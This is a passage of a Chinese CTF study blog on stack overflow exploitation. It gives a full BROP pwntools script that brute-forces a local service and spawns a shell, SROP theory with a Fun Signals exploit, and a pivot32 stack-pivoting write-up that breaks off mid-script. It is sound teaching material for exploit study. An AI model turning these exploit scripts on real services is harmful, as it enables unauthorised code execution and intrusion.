class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"><span class="comment"># context.log_level = &quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_buffer_size</span>():</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">        payload = <span class="string">&#x27;A&#x27;</span> * i</span><br><span class="line">        buffsize = <span class="built_in">len</span>(payload) - <span class="number">1</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            io = remote(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">10001</span>)</span><br><span class="line">            io.sendafter(<span class="string">&quot;ssword?\n&quot;</span>, payload)</span><br><span class="line">            io.recvline()</span><br><span class="line">            io.close()</span><br><span class="line">            log.info(<span class="string">&quot;bad buffsize: %d&quot;</span> % buffsize)</span><br><span class="line">        <span class="keyword">except</span> EOFError <span class="keyword">as</span> e:</span><br><span class="line">            io.close()</span><br><span class="line">            log.info(<span class="string">&quot;buffsize: %d&quot;</span> % buffsize)</span><br><span class="line">            <span class="keyword">return</span> buffsize</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_stop_addr</span>(<span class="params">buf_size</span>):</span></span><br><span class="line">    addr = <span class="number">0x400000</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        sleep(<span class="number">0.1</span>)</span><br><span class="line">        addr += <span class="number">1</span></span><br><span class="line">        payload = <span class="string">b&#x27;A&#x27;</span> * buf_size</span><br><span class="line">        payload += p64(addr)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            io = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">10001</span>)</span><br><span class="line">            io.sendafter(<span class="string">&quot;ssword?\n&quot;</span>, payload)</span><br><span class="line">            io.recvline()</span><br><span class="line">            io.close()</span><br><span class="line">            log.info(<span class="string">&quot;stop address: 0x%x&quot;</span> % addr)</span><br><span class="line">            <span class="keyword">return</span> addr</span><br><span class="line">        <span class="keyword">except</span> EOFError <span class="keyword">as</span> e:</span><br><span class="line">            io.close()</span><br><span class="line">            log.info(<span class="string">&quot;bad 0x%x&quot;</span> % addr)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            log.info(<span class="string">&quot;Can&#x27;t connect&quot;</span>)</span><br><span class="line">            addr -= <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_gadgets_addr</span>(<span class="params">buf_size, stop_addr</span>):</span></span><br><span class="line">    addr = stop_addr</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        addr += <span class="number">1</span></span><br><span class="line">        payload = <span class="string">b&#x27;A&#x27;</span> * buf_size + p64(addr) + <span class="string">b&#x27;AAAAAAAA&#x27;</span> * <span class="number">6</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            io = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">10001</span>)</span><br><span class="line">            io.sendafter(<span class="string">&quot;ssword?\n&quot;</span>, payload+ p64(stop_addr))</span><br><span class="line">            io.recv(timeout=<span class="number">1</span>)</span><br><span class="line">            io.close()</span><br><span class="line">            log.info(<span class="string">&quot;find address: 0x%x&quot;</span> % addr)</span><br><span class="line">            <span class="keyword">try</span>:        <span class="comment"># check gadget</span></span><br><span class="line">                io = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">10001</span>)</span><br><span class="line">                io.sendafter(<span class="string">&quot;ssword?\n&quot;</span>, payload)</span><br><span class="line">                io.recv(timeout=<span class="number">1</span>)</span><br><span class="line">                io.close()</span><br><span class="line">                log.info(<span class="string">&quot;bad address : 0x%x&quot;</span> % addr)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                io.close()</span><br><span class="line">                log.info(<span class="string">&quot;gadget address: 0x%x&quot;</span> % addr)</span><br><span class="line">                <span class="keyword">return</span> addr</span><br><span class="line">        <span class="keyword">except</span> EOFError <span class="keyword">as</span> e:</span><br><span class="line">            io.close()</span><br><span class="line">            log.info(<span class="string">&quot;bad: 0x%x&quot;</span> % addr)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            log.info(<span class="string">&quot;Can&#x27;t connect&quot;</span>)</span><br><span class="line">            addr -= <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_puts_call_addr</span>(<span class="params">buf_size, stop_addr, gadgets_addr</span>):</span></span><br><span class="line">    addr = stop_addr</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        sleep(<span class="number">0.1</span>)</span><br><span class="line">        addr += <span class="number">1</span></span><br><span class="line">        payload = <span class="string">b&#x27;A&#x27;</span> * buf_size + p64(gadgets_addr + <span class="number">9</span>) + p64(<span class="number">0x400000</span>) + p64(addr) + p64(stop_addr)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            io = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">10001</span>)</span><br><span class="line">            io.sendafter(<span class="string">&quot;ssword?\n&quot;</span>, payload)</span><br><span class="line">            <span class="keyword">if</span> io.recv().startswith(<span class="string">b&#x27;\x7fELF&#x27;</span>):</span><br><span class="line">                log.info(<span class="string">&quot;puts call address:0x%x&quot;</span> % addr)</span><br><span class="line">                io.close()</span><br><span class="line">                <span class="keyword">return</span> addr</span><br><span class="line">            log.info(<span class="string">&quot;bad: 0x%x&quot;</span> % addr)</span><br><span class="line">            io.close()</span><br><span class="line">        <span class="keyword">except</span> EOFError <span class="keyword">as</span> e:</span><br><span class="line">            io.close()</span><br><span class="line">            log.info(<span class="string">&quot;bad: 0x%x&quot;</span> % addr)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            log.info(<span class="string">&quot;Can&#x27;t connect&quot;</span>)</span><br><span class="line">            addr -= <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dump_memory</span>(<span class="params">buf_size, stop_addr, gadgets_addr, puts_call_addr, start_addr, end_addr</span>):</span></span><br><span class="line">    result = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">while</span> start_addr &lt; end_addr:</span><br><span class="line">        sleep(<span class="number">0.1</span>)</span><br><span class="line">        payload = <span class="string">b&#x27;A&#x27;</span> * buf_size</span><br><span class="line">        payload+= p64(gadgets_addr+<span class="number">9</span>)</span><br><span class="line">        payload+= p64(start_addr)</span><br><span class="line">        payload+= p64(puts_call_addr)</span><br><span class="line">        payload += p64(stop_addr)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            io = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">10001</span>)</span><br><span class="line">            io.sendafter(<span class="string">&quot;ssword?\n&quot;</span>, payload)</span><br><span class="line">            data = io.recv()[:-<span class="number">1</span>]</span><br><span class="line">            <span class="keyword">if</span> data == <span class="string">b&#x27;&#x27;</span>:</span><br><span class="line">                data = <span class="string">b&quot;\x00&quot;</span></span><br><span class="line">            log.info(<span class="string">&quot;leaking: 0x%x ---&gt; %s&quot;</span> % (start_addr, hexlify(data)))</span><br><span class="line">            result += data</span><br><span class="line">            start_addr += <span class="built_in">len</span>(data)</span><br><span class="line">            io.close()</span><br><span class="line">        <span class="keyword">except</span> EOFError:</span><br><span class="line">            log.info(<span class="string">&quot;EOF&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> result</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            log.info(<span class="string">&quot;Can&#x27;t connect&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_puts_addr</span>(<span class="params">buf_size, stop_addr, gadgets_addr, puts_call_addr, puts_got</span>):</span></span><br><span class="line">    payload = <span class="string">b&#x27;A&#x27;</span> * buf_size</span><br><span class="line">    payload+= p64(gadgets_addr+<span class="number">9</span>)</span><br><span class="line">    payload+= p64(puts_got)</span><br><span class="line">    payload+= p64(puts_call_addr)</span><br><span class="line">    payload += p64(stop_addr)</span><br><span class="line">    io = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">10001</span>)</span><br><span class="line">    io.sendafter(<span class="string">&quot;ssword?\n&quot;</span>, payload)</span><br><span class="line">    data = io.recvline()[:-<span class="number">1</span>]</span><br><span class="line">    data = u64(data.ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">    log.info(<span class="string">&quot;puts address: 0x%x&quot;</span> % data)</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>(<span class="params">gadgets_addr, system_addr, binsh_addr</span>):</span></span><br><span class="line">    payload = <span class="string">b&#x27;A&#x27;</span> * <span class="number">72</span> + p64(gadgets_addr+<span class="number">10</span>) +p64(gadgets_addr+<span class="number">9</span>) + p64(binsh_addr) + p64(system_addr)</span><br><span class="line">    io = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">10001</span>)</span><br><span class="line">    io.sendafter(<span class="string">&quot;ssword?\n&quot;</span>, payload)</span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak2</span>(<span class="params">addr</span>):</span></span><br><span class="line">    buf_size = <span class="number">72</span></span><br><span class="line">    gadgets_addr = <span class="number">0x40078a</span></span><br><span class="line">    puts_call_addr = <span class="number">0x400547</span></span><br><span class="line"></span><br><span class="line">    payload = <span class="string">b&#x27;A&#x27;</span> * buf_size</span><br><span class="line">    payload+= p64(gadgets_addr+<span class="number">9</span>)</span><br><span class="line">    payload+= p64(addr)</span><br><span class="line">    payload+= p64(puts_call_addr)</span><br><span class="line">    io = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">10001</span>)</span><br><span class="line">    io.sendafter(<span class="string">&quot;ssword?\n&quot;</span>, payload)</span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    data = io.recv()[:-<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> data == <span class="string">b&#x27;&#x27;</span>:</span><br><span class="line">        data = <span class="string">b&quot;\x00&quot;</span></span><br><span class="line">    log.info(<span class="string">&#x27;leaking: &#123;0&#125;: &#123;1&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(addr), hexlify(data)))</span><br><span class="line">    io.close()</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak1</span>(<span class="params">puts_addr</span>):</span></span><br><span class="line">    system_addr = puts_addr - <span class="number">0x80970</span> + <span class="number">0x4f420</span></span><br><span class="line">    binsh_addr = puts_addr - <span class="number">0x80970</span> + <span class="number">0x1b3d88</span></span><br><span class="line">    <span class="keyword">return</span> system_addr, binsh_addr</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_ret_addr</span>():</span> <span class="comment"># get func return addr to get the base address</span></span><br><span class="line">    retaddr = <span class="string">b&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        j = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> j &lt;= <span class="number">255</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                tmp_addr = <span class="built_in">bytes</span>([j])</span><br><span class="line">                io = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">10001</span>)</span><br><span class="line">                payload = <span class="string">b&#x27;A&#x27;</span> * <span class="number">72</span> + retaddr + tmp_addr</span><br><span class="line">                io.sendafter(<span class="string">&quot;ssword?\n&quot;</span>, payload)</span><br><span class="line">                sleep(<span class="number">0.2</span>)</span><br><span class="line">                tmp_recv = io.recv(timeout=<span class="number">1</span>)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">b&#x27;No password&#x27;</span> <span class="keyword">in</span> tmp_recv:</span><br><span class="line">                    retaddr = retaddr + tmp_addr</span><br><span class="line">                    log.info(<span class="string">&quot;------------&gt;correct address: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(hexlify(retaddr)))</span><br><span class="line">                    io.close()</span><br><span class="line">                    j = j + <span class="number">1</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    log.info(<span class="string">&quot;bad address: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(hexlify(tmp_addr)))</span><br><span class="line">                    j = j + <span class="number">1</span></span><br><span class="line">                    io.close()</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">except</span> EOFError:</span><br><span class="line">                io.close()</span><br><span class="line">                j = j + <span class="number">1</span></span><br><span class="line">                log.info(<span class="string">&quot;bad address: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(hexlify(tmp_addr)))</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                log.info(<span class="string">&quot;Cant&#x27;t connect&quot;</span>)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">    log.info(<span class="string">&quot;return address: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(hexlify(retaddr[::-<span class="number">1</span>])))</span><br><span class="line">    <span class="keyword">return</span> retaddr</span><br><span class="line"></span><br><span class="line"><span class="comment"># buffersize = get_buffer_size()  # 72</span></span><br><span class="line"><span class="comment"># stop_addr = get_stop_addr(72)     # 0x400545</span></span><br><span class="line"><span class="comment"># gadgets_addr = get_gadgets_addr(72, 0x400545) #0x40078a</span></span><br><span class="line"><span class="comment"># puts_call_addr = get_puts_call_addr(72, 0x400545, 0x40078a) # 0x400547</span></span><br><span class="line"><span class="comment"># result = dump_memory(72, 0x400545, 0x40078a, 0x400547, 0x400000, 0x403000)</span></span><br><span class="line"><span class="comment"># with open(&quot;code1.bin&quot;, &#x27;wb&#x27;) as f:</span></span><br><span class="line"><span class="comment">#     f.write(result)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># puts_got = 0x601018</span></span><br><span class="line"><span class="comment"># puts_addr = get_puts_addr(72, 0x400545, 0x40078a, 0x400547,puts_got) # 0x7ffff7a62970</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># leak1</span></span><br><span class="line"><span class="comment"># system_addr, binsh_addr = leak1(0x7ffff7a62970)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># leak2</span></span><br><span class="line"><span class="comment"># data = DynELF(leak2, 0x0400590)</span></span><br><span class="line"><span class="comment"># system_addr = data.lookup(&#x27;system&#x27;, &#x27;libc&#x27;)</span></span><br><span class="line"><span class="comment"># log.info(&quot;ststem_addr : &#123;&#125;&quot;.format(hex(system_addr)))   # 0x7ffff7a31420</span></span><br><span class="line"><span class="comment"># binsh_addr = system_addr - 0x4f420 + 0x1b3d88</span></span><br><span class="line"><span class="comment"># sleep(1)</span></span><br><span class="line"><span class="comment"># pwn(0x40078a, 0x7ffff7a31420, binsh_addr)</span></span><br><span class="line"></span><br><span class="line">get_ret_addr()</span><br></pre></td></tr></table></figure>

<blockquote>
<p>参考文章：<a target="_blank" rel="noopener" href="https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/6.1.1_pwn_hctf2016_brop.html">https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/6.1.1_pwn_hctf2016_brop.html</a></p>
</blockquote>
<h2 id="SROP"><a href="#SROP" class="headerlink" title="SROP"></a>SROP</h2><p>SROP与ROP类似，通过栈溢出，覆盖返回地址并执行gadgets控制执行流。不同的是，SROP使用能够调用sigreturn的gadget覆盖返回地址，并将一个伪造的sigcontext结构体放在栈中。这个地方有点类似windows那个挂起线程，然后设置线程上下文，然后恢复线程的 设置线程上下文然后恢复线程。</p>
<h3 id="SROP原理"><a href="#SROP原理" class="headerlink" title="SROP原理"></a>SROP原理</h3><h4 id="Linux系统调用"><a href="#Linux系统调用" class="headerlink" title="Linux系统调用"></a>Linux系统调用</h4><p>Linux的系统调用中，64位和32位的系统调用表分别位于/usr/include/asm/unistd_64.h和/usr/include/asm/unistd_32.h中，另外还需要查看/usr/include/bits/syscall.h</p>
<p>比如write的系统调用号是1，就往RAX里存入1，执行syscall，其实就是执行的write函数，当然rdi, rsi, rdx 得存入参数才可以</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//syscall.h</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> __NR_writev</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> SYS_writev __NR_writev</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">...</span><br><span class="line"><span class="comment">//   unistd_64.h </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_write 1</span></span><br></pre></td></tr></table></figure>

<p><code>int 0x80</code> 即80中断， 是最老的系统函数调用方式</p>
<p><code>syscall/sysret</code> 是amd64 制定的标准， 也是目前的x86 64位的标准，即amd64</p>
<p><code>sysenter/syssysexit</code> 是inter制定的x86 64位标准， 目前已被放弃</p>
<p><code>vdso</code> 是linux内核虚拟出的so, 实现了int 80 和 syscall，调用方式为 vsyscall</p>
<h4 id="signal机制"><a href="#signal机制" class="headerlink" title="signal机制"></a>signal机制</h4><p>当有中断或异常发送时，内核会向某个进程发送一个signal，该进程被挂起并进入内核，然后内核为其保存相应的上下文，再跳转到之前注册好的signal handler中进程处理，待signal handler返回后，内核为该进程恢复之前保存的上下文，最终恢复执行。（这个地方好像windows的异常处理啊），具体步骤如下。</p>
<ol>
<li>一个signal frame被添加到栈，这个frame中包含了当前寄存器的值和一些signal信息；</li>
<li>一个新的返回地址被添加到栈顶，这个返回地址指向sigreturn 系统调用；</li>
<li>signal handler被调用，signal handler的行为取决于收到了什么signal</li>
<li>signal handler执行完后，如果程序没有终止，则返回地址用于执行sigreturn 系统调用</li>
<li>sigreturn 利用 signal frame恢复所有的寄存器以回到之前的状态。</li>
<li>最后，程序执行继续。</li>
</ol>
<p>SROP，即Sigreturn Oriented Programming，就可以利用上面的第5步来进行攻击，即将返回地址覆盖为sigreturn gadget的指针，如果只有syscall，将RAX改为0XF，效果是一样的，然后在栈上覆盖上fake frame即可</p>
<blockquote>
<p>参考文章 <a target="_blank" rel="noopener" href="https://energygreek.github.io/2020/11/09/system-calls-method/">https://energygreek.github.io/2020/11/09/system-calls-method/</a></p>
</blockquote>
<h3 id="pwntools-srop模块"><a href="#pwntools-srop模块" class="headerlink" title="pwntools srop模块"></a>pwntools srop模块</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line">SigreturnFrame(kernel=<span class="string">&#x27;i386&#x27;</span>)	<span class="comment"># 32位系统运行32位程序</span></span><br><span class="line">SigreturnFrame(kernel=<span class="string">&#x27;amd64&#x27;</span>)	<span class="comment"># 64位系统运行32位程序</span></span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">SigreturnFrame(kernel=<span class="string">&#x27;amd64&#x27;</span>)	<span class="comment"># 64位系统运行64位程序</span></span><br></pre></td></tr></table></figure>

<h3 id="Backdoor-CTF2017-Fun-Signals"><a href="#Backdoor-CTF2017-Fun-Signals" class="headerlink" title="Backdoor CTF2017: Fun Signals"></a>Backdoor CTF2017: Fun Signals</h3><img src="/2022/04/11/%E7%AC%AC10%E7%AB%A0_%E6%A0%88%E6%BA%A2%E5%87%BA%E4%B8%8EROP/image-20220330204611695.png" class="" title="image-20220330204611695">

<p>什么保护都没有开启</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">objdump -d funsignals_player_bin -M intel  </span><br><span class="line"></span><br><span class="line">funsignals_player_bin:     file format elf64-x86-64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .shellcode:</span><br><span class="line"></span><br><span class="line">0000000010000000 &lt;__start&gt;:</span><br><span class="line">    10000000:	31 c0                	xor    eax,eax</span><br><span class="line">    10000002:	31 ff                	xor    edi,edi</span><br><span class="line">    10000004:	31 d2                	xor    edx,edx</span><br><span class="line">    10000006:	b6 04                	mov    dh,0x4</span><br><span class="line">    10000008:	48 89 e6             	mov    rsi,rsp</span><br><span class="line">    1000000b:	0f 05                	syscall </span><br><span class="line">    1000000d:	31 ff                	xor    edi,edi</span><br><span class="line">    1000000f:	6a 0f                	push   0xf</span><br><span class="line">    10000011:	58                   	pop    rax</span><br><span class="line">    10000012:	0f 05                	syscall </span><br><span class="line">    10000014:	cc                   	int3   </span><br><span class="line"></span><br><span class="line">0000000010000015 &lt;syscall&gt;:</span><br><span class="line">    10000015:	0f 05                	syscall </span><br><span class="line">    10000017:	48 31 ff             	xor    rdi,rdi</span><br><span class="line">    1000001a:	48 c7 c0 3c 00 00 00 	mov    rax,0x3c</span><br><span class="line">    10000021:	0f 05                	syscall </span><br><span class="line"></span><br><span class="line">0000000010000023 &lt;flag&gt;:</span><br><span class="line">    10000023:	66 61                	data16 (bad) </span><br><span class="line">    10000025:	6b 65 5f 66          	imul   esp,DWORD PTR [rbp+0x5f],0x66</span><br><span class="line">    10000029:	6c                   	ins    BYTE PTR es:[rdi],dx</span><br><span class="line">    1000002a:	61                   	(bad)  </span><br><span class="line">    1000002b:	67 5f                	addr32 pop rdi</span><br><span class="line">    1000002d:	68 65 72 65 5f       	push   0x5f657265</span><br><span class="line">    10000032:	61                   	(bad)  </span><br><span class="line">    10000033:	73 5f                	jae    10000094 &lt;flag+0x71&gt;</span><br><span class="line">    10000035:	6f                   	outs   dx,DWORD PTR ds:[rsi]</span><br><span class="line">    10000036:	72 69                	jb     100000a1 &lt;flag+0x7e&gt;</span><br><span class="line">    10000038:	67 69 6e 61 6c 5f 69 	imul   ebp,DWORD PTR [esi+0x61],0x73695f6c</span><br><span class="line">    1000003f:	73 </span><br><span class="line">    10000040:	5f                   	pop    rdi</span><br><span class="line">    10000041:	61                   	(bad)  </span><br><span class="line">    10000042:	74 5f                	je     100000a3 &lt;flag+0x80&gt;</span><br><span class="line">    10000044:	73 65                	jae    100000ab &lt;flag+0x88&gt;</span><br><span class="line">    10000046:	72 76                	jb     100000be &lt;flag+0x9b&gt;</span><br><span class="line">    10000048:	65 72 00             	gs jb  1000004b &lt;flag+0x28&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>可以发现程序，先执行了read命令，rdx,0x400，rsi是rsp rdi是0 ，执行read读入数据，把数据写到栈上，然后在执行调用号为0xf的系统调用</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_read 0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_rt_sigreturn 15</span></span><br></pre></td></tr></table></figure>

<p>所以只需要构造sigreturn frame，然后读入就OK了, exp为↓</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./funsignals_player_bin&quot;</span>)</span><br><span class="line">io = process(<span class="string">&quot;./funsignals_player_bin&quot;</span>)</span><br><span class="line"></span><br><span class="line">context.clear()</span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = constants.SYS_write</span><br><span class="line">frame.rdi = constants.STDOUT_FILENO</span><br><span class="line">frame.rsi = elf.symbols[<span class="string">&#x27;flag&#x27;</span>]</span><br><span class="line">frame.rdx = <span class="number">50</span></span><br><span class="line">frame.rip = elf.symbols[<span class="string">&#x27;syscall&#x27;</span>]</span><br><span class="line"></span><br><span class="line">io.send(<span class="built_in">bytes</span>(frame))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="stack-pivoting"><a href="#stack-pivoting" class="headerlink" title="stack pivoting"></a>stack pivoting</h2><p>stack pivoting 是一种将程序真实的堆栈转移到伪造堆栈上的技术，可用于绕过不可执行栈保护或者处理栈空间过小的情况。下面通过1个例题(32位的，书上还有个64位的，但是基本一样，不写了。。)来说下这种技术，这是ROP Emporium上的那个题</p>
<h3 id="pivot32"><a href="#pivot32" class="headerlink" title="pivot32"></a>pivot32</h3><p>IDA打开分析</p>
<img src="/2022/04/11/%E7%AC%AC10%E7%AB%A0_%E6%A0%88%E6%BA%A2%E5%87%BA%E4%B8%8EROP/image-20220403194200757.png" class="" title="image-20220403194200757">

<p>是在pwnme这个函数中存在栈溢出，但是只溢出了16个字节，显然对于构造ROP链是不够的，所以我们要用到栈转移技术，怎么转移呢？其实就是用了leave ret指令，leave ret，其实就跟mov esp, ebp; pop ebp; pop rip的效果是一样的,</p>
<img src="/2022/04/11/%E7%AC%AC10%E7%AB%A0_%E6%A0%88%E6%BA%A2%E5%87%BA%E4%B8%8EROP/image-20220403194927269.png" class="" title="image-20220403194927269">

<p>我们把old ebp的位置覆盖为leakaddr - 4.然后执行mov esp,ebp， 所以现在esp就是leakaddr - 4了，然后再执行pop ebp， leak addr - 4这个位置的数就给了ebp了，然后esp执行leak addr，再执行ret的时候，就从leak addr这里取地址了，这样就完成了栈转移</p>
<p>回到这个例题，我们第一次输入的数据存到新栈那里，这里就是真正的要构造的ROP了，目的是为了执行 call ret2win来获取flag（这个函数应该是作者定义的，放到了libpivot32.so中），第二次输入的数据就存在旧栈那里，目的就是转移栈。</p>
<p>exp为:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;pivot32&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;pivot32&quot;</span>)</span><br><span class="line">lib = ELF(<span class="string">&quot;libpivot32.so&quot;</span>)</span><br><span class="line"></span><br><span class="line">context.terminal = [<span 